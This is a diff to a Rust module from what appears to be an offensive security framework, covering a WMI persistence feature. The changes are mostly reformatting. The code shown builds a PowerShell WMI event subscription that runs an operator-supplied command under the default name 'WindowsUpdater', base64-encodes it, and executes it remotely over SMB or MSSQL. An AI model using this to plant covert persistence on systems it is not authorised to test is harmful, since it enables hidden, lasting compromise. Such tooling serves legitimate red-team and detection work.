@@ -4,7 +4,7 @@
 
 use anyhow::Result;
 use async_trait::async_trait;
-use nxc_protocols::{NxcSession, NxcProtocol};
+use nxc_protocols::{NxcProtocol, NxcSession};
 
 use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
 
@@ -40,7 +40,9 @@ impl NxcModule for WmiPersistModule {
         vec![
             ModuleOption {
                 name: "PAYLOAD".to_string(),
-                description: "Command to execute (e.g. 'cmd.exe /c calc.exe'). Required if action=install.".to_string(),
+                description:
+                    "Command to execute (e.g. 'cmd.exe /c calc.exe'). Required if action=install."
+                        .to_string(),
                 required: false,
                 default: None,
             },
@@ -65,10 +67,15 @@ impl NxcModule for WmiPersistModule {
         opts: &ModuleOptions,
     ) -> Result<ModuleResult> {
         let action = opts.get("ACTION").map(|s| s.as_str()).unwrap_or("install");
-        let name = opts.get("NAME").map(|s| s.as_str()).unwrap_or("WindowsUpdater");
-        
+        let name = opts
+            .get("NAME")
+            .map(|s| s.as_str())
+            .unwrap_or("WindowsUpdater");
+
         let script = if action == "install" {
-            let payload = opts.get("PAYLOAD").ok_or_else(|| anyhow::anyhow!("PAYLOAD option is required for install"))?;
+            let payload = opts
+                .get("PAYLOAD")
+                .ok_or_else(|| anyhow::anyhow!("PAYLOAD option is required for install"))?;
             format!(
                 r#"$f=Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{Name='{0}';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'}}
 $c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{Name='{0}';CommandLineTemplate='{1}'}}
@@ -85,11 +92,19 @@ Write-Output 'WMI Persistence Cleaned Up Successfully'"#,
                 name
             )
         } else {
-            return Err(anyhow::anyhow!("Invalid ACTION: must be 'install' or 'cleanup'"));
+            return Err(anyhow::anyhow!(
+                "Invalid ACTION: must be 'install' or 'cleanup'"
+            ));
         };
 
         // Base64 encode the script to avoid quoting issues
-        let b64_script = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>());
+        let b64_script = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            script
+                .encode_utf16()
+                .flat_map(|u| u.to_le_bytes())
+                .collect::<Vec<u8>>(),
+        );
         let cmd = format!("powershell -e {}", b64_script);
 
         // Execute via the active protocol
@@ -110,11 +125,17 @@ Write-Output 'WMI Persistence Cleaned Up Successfully'"#,
                 let proto = nxc_protocols::mssql::MssqlProtocol::new();
                 proto.execute(session, &cmd).await?
             }
-            _ => return Err(anyhow::anyhow!("Protocol {} does not support execution", session.protocol())),
+            _ => {
+                return Err(anyhow::anyhow!(
+                    "Protocol {} does not support execution",
+                    session.protocol()
+                ))
+            }
         };
 
         Ok(ModuleResult {
-            credentials: vec![], success: true,
+            credentials: vec![],
+            success: true,
             output: format!("Execution Output:\n{}", output.stdout),
             data: serde_json::json!({
                 "action": action,
